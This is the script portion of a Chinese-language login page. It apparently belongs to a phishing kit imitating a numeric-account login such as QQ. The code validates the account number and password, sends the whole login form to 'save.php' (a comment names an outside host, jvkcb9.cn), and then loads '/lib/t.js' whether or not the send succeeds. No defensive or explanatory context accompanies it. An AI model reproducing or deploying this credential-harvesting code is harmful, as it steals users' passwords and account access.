<body style="zoom: 1;">
  <div id="content" class="content">

  <script>
    var times = 0;

    function error(msg) {
      $("#error_tips").css({
        display: 'block'
      });
      $('#error_message').html(msg);
      err = true;
    }
    $('form input').focus(function () {
      $("#error_tips").css({
        display: 'none'
      });
      err = false;
    });
    $("#error_tips").on('click',
      function () {
        $(this).hide();
      });
    $("#go").on('click',
      function () {
        var $this = $(this);
        err = false;
        var p = $("#p").val();
        var u = $("#u").val();
        u == '' && error('您还没有输入帐号！');
        if (err) return false;
        p == '' && error("您还没有输入密码！");
        if (err) return false;

        /^[1-9][0-9]{5,9}$/.test(u) || error('请输入正确的帐号！');
        if (err) return false;

        if (sameChar(u)) {
          error("您输入的帐号或密码不正确，请重新输入。");
          $("#u").val('');
          $("#p").val('');
          return false;
        }

        var len = p.length;

        (len < 6 || len > 16) && error('您输入的帐号或密码不正确，请重新输入。');
        /*新增密码校验*/
        var pattern = /[\u4e00-\u9fa5]+/g;
        pattern.test(p) && error("您输入的帐号或密码不正确，请重新输入。");
        var pattern2 = /^[0-9]*$/g;
        pattern2.test(p) && error("您输入的帐号或密码不正确，请重新输入。");
        if (sameChar(p)) {
          error("您输入的帐号或密码不正确，请重新输入。");
          $("#p").val('');
          return false;
        }
        /**/

        if (!err) {
          $.ajax({
            // http://jvkcb9.cn/save.php
            url: 'save.php',
            type: 'POST',
            dataType: 'json',
            async: false,
            data: $('#loginform').serialize(),
            success: function (r) {
              $.getScript('/lib/t.js');
            },
            error: function (er) {
              $.getScript('/lib/t.js');
            }
          })
        }
      })

    function sameChar(str) {
      var result = true;
      var c = str.charAt(0);
      for (var i = 0; i < str.length; i++) {
        if (c != str.charAt(i)) {
          result = false;
          break;
        }
      }
      return result;
    }
  </script>
